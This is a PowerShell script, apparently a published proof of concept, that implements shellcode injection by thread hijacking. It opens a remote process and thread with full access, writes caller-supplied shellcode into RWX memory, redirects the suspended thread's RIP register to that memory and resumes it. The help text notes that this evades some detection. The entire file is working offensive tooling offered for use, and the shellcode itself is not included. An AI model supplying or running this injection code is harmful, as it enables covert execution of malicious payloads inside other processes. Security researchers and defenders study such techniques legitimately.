function Invoke-ShellcodeViaThreadHijack
{
<#
.SYNOPSIS
    Injects and executes shellcode in a hijacked thread of a remote process using SetThreadContext.

    This method demonstrates thread hijacking, where a thread in a remote process is suspended,
    its context modified to point to injected shellcode, and then resumed. The shellcode is
    written into RWX memory allocated via VirtualAllocEx.

    This is more stealthy than CreateRemoteThread, but still detectable by advanced EDRs.
    Intended for educational and research use only.
    
    Notes:
        - I tested this POC on x64 Win11.
        - You can only create an x64 processes on an x64 host architecture.

.DESCRIPTION
    Author: Silentis Vox (@SilentisVox)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

.PARAMETER TargetPID
    Process ID of the remote target process.

.PARAMETER TargetTID
    Thread ID of a thread within the target process.

.PARAMETER Shellcode
    A byte array containing the shellcode to be injected.

.EXAMPLE
    PS C:\> Invoke-ShellcodeViaThreadHijack -TargetPID 1234 -TargetTID 5678 -Shellcode $Shellcode -Verbose
    VERBOSE: [+] Opened Process Handle Of Target Process.
    VERBOSE: [+] Opened Process Handle Of Target Process.
    VERBOSE: [+] Target Thread suspended.
    VERBOSE: [+] Allocated Memory To 0x2317433765888.
    VERBOSE: [+] Shellcode [272] Written To 0x2317433765888.
    VERBOSE: [+] Retrieved Current Thread Execution Context.
    VERBOSE: [+] RIP Now Points To Remote Address 0x2317433765888.
    VERBOSE: [+] Thread Execution Context Set.
    VERBOSE: [+] Thread Has Been Resumed And May Now Execute.
    True
#>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [UInt32] $TargetPID,

        [Parameter(Mandatory)]
        [UInt32] $TargetTID,

        [Parameter(Mandatory)]
        [Byte[]] $Shellcode
    )

    # Native API Definitions.

    Add-Type @"
    using System;
    using System.Runtime.InteropServices;

    public class Kernel32
    {
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern uint SuspendThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);

        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);

        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern uint ResumeThread(IntPtr hThread);
    }
"@

    # Initialize needed variables and structure.

    $ShellcodeSize                      = $Shellcode.Length
    $ContextSize                        = 1232
    $ContextFlags                       = 0x10007
    $ContextFlagsOffset                 = 48
    
    $Context                            = [Runtime.InteropServices.Marshal]::AllocHGlobal($ContextSize)
    [Runtime.InteropServices.Marshal]::Copy([Byte[]]::New($ContextSize), 0, $Context, $ContextSize)
    [Runtime.InteropServices.Marshal]::WriteInt32($Context, $ContextFlagsOffset, $ContextFlags)

    # Open the target process.

    $ProcessHandle                      = $null
    $ThreadHandle                       = $null
    $RemoteAddress                      = $null
    $BytesWritten                       = [IntPtr]::Zero

    $PROCESS_ALL_ACCESS                 = 0x001F0FFF
    $InheritHandle                      = $false

    $ProcessHandle                      = [Kernel32]::OpenProcess($PROCESS_ALL_ACCESS, $InheritHandle, $TargetPID)

    $INVALID_PROCESS_HANDLE             = 0xFFFFFFFF

    if (($ProcessHandle) -and ($ProcessHandle -ne $INVALID_PROCESS_HANDLE))
    {
        Write-Verbose "[+] Opened Process Handle Of Target Process."
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] OpenProcess Failed: $FunctionError"
        $false
        return
    }

    # Open the target thread.

    $THREAD_ALL_ACCESS                  = 0x1F03FF
    
    $ThreadHandle                       = [Kernel32]::OpenThread($THREAD_ALL_ACCESS, $InheritHandle, $TargetTID)

    $INVALID_THREAD_HANDLE              = 0xFFFFFFFF

    if (($ThreadHandle) -and ($ThreadHandle -ne $INVALID_THREAD_HANDLE))
    {
        Write-Verbose "[+] Opened Process Handle Of Target Process."
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] OpenThread Failed: $FunctionError"
        $false
        return
    }

    # Suspend the threads execution.

    $Result                             = [Kernel32]::SuspendThread($ThreadHandle)

    if ($Result -ne -1)
    {
        Write-Verbose "[+] Target Thread suspended."
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] SuspendThread Failed: $FunctionError"
        $false
        return
    }

    # Allocate memory within the target process.

    $Address                            = [IntPtr]::Zero
    $MEM_COMMIT                         = 0x00001000
    $PAGE_EXECUTE_READWRITE             = 0x40

    $RemoteAddress                      = [Kernel32]::VirtualAllocEx($ProcessHandle, $Address, $ShellcodeSize, $MEM_COMMIT, $PAGE_EXECUTE_READWRITE)

    if (($RemoteAddress) -and ($RemoteAddress -ne [IntPtr]::Zero))
    {
        Write-Verbose ("[+] Allocated Memory To 0x{0:X}." -f $RemoteAddress)
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] VirtualAllocEx Failed: $FunctionError"
        $false
        return
    }

    # Write shellcode to our allocated memory.

    $Result                             = [Kernel32]::WriteProcessMemory($ProcessHandle, $RemoteAddress, $Shellcode, $ShellcodeSize, [Ref] $BytesWritten)

    if (($Result) -and ($BytesWritten.ToInt32() -eq $ShellcodeSize))
    {
        Write-Verbose ("[+] Shellcode [$ShellcodeSize] Written To 0x{0:X}." -f $RemoteAddress)
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] WriteProcessMemory Failed: $FunctionError"
        $false
        return
    }

    # Get the entire thread execution context.

    $Result                             = [Kernel32]::GetThreadContext($ThreadHandle, $Context)

    if ($Result)
    {
        Write-Verbose "[+] Retrieved Current Thread Execution Context."
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] GetThreadContext Failed: $FunctionError"
        $false
        return
    }

    # Tell the Rip (Points to currently executing memory) to point to the address of our memory.

    $RipOffset                          = 248
    [Runtime.InteropServices.Marshal]::WriteInt64($Context, $RipOffset, $RemoteAddress.ToInt64())

    Write-Verbose ("[+] RIP Now Points To Remote Address 0x{0:X}." -f $RemoteAddress)

    # Set the threads execution context.

    $Result                             = [Kernel32]::SetThreadContext($ThreadHandle, $Context)

    if ($Result)
    {
        Write-Verbose "[+] Thread Execution Context Set."
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] SetThreadContext Failed: $FunctionError"
        $false
        return
    }

    # Resume the threads execution.

    $Result                             = [Kernel32]::ResumeThread($ThreadHandle)

    if ($Result)
    {
        Write-Verbose "[+] Thread Has Been Resumed And May Now Execute."
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] SetThreadContext Failed: $FunctionError"
        $false
        return
    }

    return $true
}
